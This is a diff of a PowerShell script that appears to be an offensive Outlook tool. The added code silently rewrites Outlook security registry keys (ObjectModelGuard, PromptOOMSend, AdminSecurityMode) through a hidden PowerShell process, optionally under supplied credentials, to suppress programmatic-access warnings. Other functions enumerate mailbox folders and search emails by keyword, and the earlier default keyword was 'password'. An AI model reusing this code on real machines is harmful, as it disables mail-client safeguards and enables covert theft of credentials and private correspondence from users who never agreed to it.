@@ -119,72 +119,72 @@ Function Disable-SecuritySettings{
     }
     
 
-    if($User -and $Password){
+    $LMSecurityKey = "HKLM:\SOFTWARE\Microsoft\Office\$Version\Outlook\Security"
         
-        #Create the PSCredential Object 
+    $CUSecurityKey = "HKCU:\SOFTWARE\Policies\Microsoft\Office\$Version\outlook\security"
+
+    $ObjectModelGuard = "ObjectModelGuard"
+    $PromptOOMSend = "PromptOOMSend"
+    $AdminSecurityMode = "AdminSecurityMode" 
+
+    if(!(Test-Path $LMSecurityKey)){
+        #if the key does not exists, create or update the appropriate reg keys values.
+        $cmd = "New-Item $LMSecurityKey -Force;"
+        $cmd += "New-ItemProperty $LMSecurityKey -Name $ObjectModelGuard -Value 2 -PropertyType DWORD -Force;"
+
+        #Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd       
+
+    }
+    else{
+            
+        if((Get-ItemProperty $LMSecurityKey -Name $ObjectModelGuard).ObjectModelGuard){
+
+            $cmd = "Set-ItemProperty $LMSecurityKey -Name $ObjectModelGuard -Value 2 -Force;" 
+        }
+        else{
+            $cmd = "New-ItemProperty $LMSecurityKey -Name $ObjectModelGuard -Value 2 -PropertyType DWORD -Force;"
+        }
+
+        #Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd       
+                
+    }
+    if(!(Test-Path $CUSecurityKey)){
+
+        $cmd += "New-Item $CUSecurityKey -Force;"
+        $cmd += "New-ItemProperty $CUSecurityKey -Name $PromptOOMSend -Value 2 -PropertyType DWORD -Force;" 
+        $cmd += "New-ItemProperty $CUSecurityKey -Name $AdminSecurityMode -Value 3 -PropertyType DWORD -Force;"
+
+        #Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd       
+    }
+    else{
+        if((Get-ItemProperty $CUSecurityKey -Name $PromptOOMSend).PromptOOMSend){
+                
+            $cmd += "Set-ItemProperty $CUSecurityKey -Name $PromptOOMSend -Value 2 -Force;"
+        }
+        else{
+            $cmd += "New-ItemProperty $CUSecurityKey -Name $PromptOOMSend -Value 2 -PropertyType DWORD -Force;"
+        }
+
+        If((Get-ItemProperty $CUSecurityKey -Name $AdminSecurityMode).$AdminSecurityMode){
+            $cmd += "Set-ItemProperty $CUSecurityKey -Name $AdminSecurityMode -Value 3 -Force"
+        }
+        else{
+            $cmd += "New-ItemProperty $CUSecurityKey -Name $AdminSecurityMode -Value 3 -PropertyType DWORD -Force"
+        }
+            
+        #Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd       
+    }
+
+    if($User -and $Password){
+
         $pw = ConvertTo-SecureString $Password -asplaintext -Force
         $creds = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$pw
-
-        $LMSecurityKey = "HKLM:\SOFTWARE\Microsoft\Office\$Version\Outlook\Security"
-        
-        $CUSecurityKey = "HKCU:\SOFTWARE\Policies\Microsoft\Office\$Version\outlook\security"
-
-        $ObjectModelGuard = "ObjectModelGuard"
-        $PromptOOMSend = "PromptOOMSend"
-        $AdminSecurityMode = "AdminSecurityMode" 
-
-        if(!(Test-Path $LMSecurityKey)){
-            #if the key does not exists, create or update the appropriate reg keys values.
-            $cmd = "New-Item $LMSecurityKey -Force;"
-            $cmd += "New-ItemProperty $LMSecurityKey -Name $ObjectModelGuard -Value 2 -PropertyType DWORD -Force;"
-
-            #Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd       
-
-        }
-        else{
-            
-            if((Get-ItemProperty $LMSecurityKey -Name $ObjectModelGuard).ObjectModelGuard){
-
-                $cmd = "Set-ItemProperty $LMSecurityKey -Name $ObjectModelGuard -Value 2 -Force;" 
-            }
-            else{
-                $cmd = "New-ItemProperty $LMSecurityKey -Name $ObjectModelGuard -Value 2 -PropertyType DWORD -Force;"
-            }
-
-            #Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd       
-                
-        }
-        if(!(Test-Path $CUSecurityKey)){
-
-            $cmd += "New-Item $CUSecurityKey -Force;"
-            $cmd += "New-ItemProperty $CUSecurityKey -Name $PromptOOMSend -Value 2 -PropertyType DWORD -Force;" 
-            $cmd += "New-ItemProperty $CUSecurityKey -Name $AdminSecurityMode -Value 3 -PropertyType DWORD -Force;"
-
-            #Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd       
-        }
-        else{
-            if((Get-ItemProperty $CUSecurityKey -Name $PromptOOMSend).PromptOOMSend){
-                
-                $cmd += "Set-ItemProperty $CUSecurityKey -Name $PromptOOMSend -Value 2 -Force;"
-            }
-            else{
-                $cmd += "New-ItemProperty $CUSecurityKey -Name $PromptOOMSend -Value 2 -PropertyType DWORD -Force;"
-            }
-
-            If((Get-ItemProperty $CUSecurityKey -Name $AdminSecurityMode).$AdminSecurityMode){
-                $cmd += "Set-ItemProperty $CUSecurityKey -Name $AdminSecurityMode -Value 3 -Force"
-            }
-            else{
-                $cmd += "New-ItemProperty $CUSecurityKey -Name $AdminSecurityMode -Value 3 -PropertyType DWORD -Force"
-            }
-            
-            #Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd       
-        }
-
         Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd
+
     }
     else{
 
+        Start-Process powershell.exe -WindowStyle hidden -ArgumentList $cmd
     }
     
 
@@ -192,8 +192,6 @@ Function Disable-SecuritySettings{
 
 
 Function Reset-SecuritySettings{}
-
-Function Get-Alias{}
 
 Function Get-OutlookFolder{
     <#
@@ -210,7 +208,7 @@ Function Get-OutlookFolder{
 
     [CmdletBinding()]
     param(
-        [Parameter(Mandatory = $False)]
+        [Parameter(Mandatory = $True, Position = 0)]
         [String]$Name
     )
 
@@ -237,9 +235,13 @@ Function Get-OutlookFolder{
         "olFolderRssFeeds" = 25
     }
 
-    $FolderName = "OlFolder"+$Name
 
-    $FolderObj =  $script:MAPI.GetDefaultFolder($OlDefaultFolders.Item($FolderName))
+
+    $DefaultFolderName = "olFolder$Name"
+
+    $Value = $OlDefaultFolders.Item($DefaultFolderName)
+
+    $FolderObj =  $script:MAPI.GetDefaultFolder($Value)
 
     $FolderObj
 
@@ -261,13 +263,13 @@ Function Get-EmailItems{
     [CmdletBinding()]
     param(
         [Parameter(Mandatory = $True, Position = 0)]
-        [String]$Folder,
+        [System.__ComObject]$Folder,
 
         [Parameter(Mandatory = $False, Position = 1)]
         [int]$MaxEmails
     )
     
-    $FOlderObj = Get-OutlookFolder -Name $Folder
+    $FOlderObj = $Folder
 
     if($MaxEmails){
         $Items = $FolderObj.Items | Select-Object -First $MaxEmails
@@ -278,7 +280,7 @@ Function Get-EmailItems{
 
     $Emails = @()
 
-    $Items | For-Each {
+    $Items | ForEach {
 
         $Email = New-Object PSObject -Property @{
             To = $_.To
@@ -328,17 +330,17 @@ Function Invoke-MailSearch{
 
     [CmdletBinding()]
     param(
-        [Parameter(Mandatory = $False, Position = 0)]
-        [string]$Folder = "Inbox",
+        [Parameter(Mandatory = $True, Position = 0)]
+        [string]$DefaultFolder,
 
-        [Parameter(Mandatory = $False, Position = 1)]
-        [string[]]$Keyword = "password",
+        [Parameter(Mandatory = $True, Position = 1)]
+        [string]$Keyword,
 
         [Parameter(Mandatory = $False, Position = 2)]
         [int]$MaxResults = 15
     )
 
-    $OF = Get-OutlookFolder -Name $Folder
+    $OF = Get-OutlookFolder -Name $DefaultFolder
 
     $Emails = Get-EmailItems -Folder $OF
 
@@ -511,7 +513,7 @@ Function Get-OutlookInstance{
         Write-Verbose "Security Prompt should be disabled"
     }
     else{
-        Disable-SecuritySettings
+        Disable-SecuritySettings -Version $OV 
         Write-Verbose "Security Prompt should be disabled"
     }
     $Script:MAPI = $script:Outlook.GetNamespace('MAPI')
